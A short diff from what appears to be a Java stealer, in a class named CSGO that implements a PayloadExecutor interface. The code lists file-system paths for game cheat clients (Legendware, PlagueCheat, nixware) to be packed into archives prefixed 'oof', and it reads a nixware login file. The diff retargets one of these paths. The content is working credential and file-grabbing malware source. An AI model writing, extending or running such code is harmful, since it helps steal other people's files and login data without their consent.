@@ -28,7 +28,7 @@ public class CSGO implements PayloadExecutor {
 
     String[][] paths = {
             {"oofLWScripts.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\Legendware\\Scripts")}, //Legendware
-            {"oofPlague.zip", (System.getProperty("user.home") + "\\AppData\\Roaming\\.minecraft\\screenshots")}, //PlagueCheat
+            {"oofPlague.zip", "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\Plague"}, //PlagueCheat
             {"oofNix.zip", "C:\\Program Files (x86)\\Steam\\steamapps\\common\\Counter-Strike Global Offensive\\nix"} //CSGO
     };
     Optional<File> nixLoginFile = FileUtil.getFile("C:\\nixware\\data.bin");
